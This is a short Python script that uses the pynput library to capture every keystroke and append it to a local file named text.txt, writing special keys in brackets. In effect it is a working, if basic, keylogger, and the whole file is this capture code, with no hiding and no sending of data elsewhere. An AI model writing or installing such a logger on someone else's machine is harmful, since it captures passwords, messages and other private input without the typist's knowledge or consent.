from pynput import keyboard

log_file= "text.txt"

def key_register (key):

    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char}')

    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f'[{key}]')


with keyboard.Listener(on_press=key_register) as listener:
    listener.join()
